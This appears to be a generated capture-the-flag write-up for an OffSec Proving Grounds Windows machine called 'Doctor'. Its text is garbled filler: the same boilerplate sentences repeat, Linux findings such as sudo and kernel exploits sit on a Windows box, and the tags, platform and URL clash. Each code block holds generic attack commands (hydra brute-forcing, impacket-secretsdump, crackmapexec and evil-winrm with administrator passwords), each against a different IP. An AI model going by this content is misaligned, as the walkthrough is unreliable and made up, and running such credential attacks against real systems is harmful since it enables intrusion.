---
TitleSEO: "OffSec Proving Grounds — Doctor (Easy Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Doctor (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Doctor. SeDebugPrivilege and Writable PATH to achieve easy compromise on Windows."
Keywords: "easy, forensics, reversing, insane, ctf, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-doctor-298.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-doctor-298/"
Date: "2025-01-22"
Tags: "Easy, Forensics, Reversing, Insane, CTF, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-doctor-298"
Permalink: "/writeups/htb-doctor-298.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Doctor** is rated **Easy** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.51.26.56`.

### Objectives

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.112.252.90/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.117.116.168 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.71.123 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.208.184 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.120.69.40/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.238.181
feroxbuster -h
crackmapexec smb 10.17.188.21 -u administrator -p 'P@ssw0rd!' --shares
```

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

Key finding: **Writable PATH**.

The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
crackmapexec smb 10.85.213.244 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.12.187.104 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.47.215.37/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.50.170.18/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.45.13
gobuster dir -u http://10.110.185.185/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.34.147.96/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.126.94.114 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `rubeus`
- `bloodhound`
- `enum4linux`
- `hydra`
- `GetNPUsers`
- `crackmapexec`

### Key Takeaways

- SeDebugPrivilege
- Writable PATH
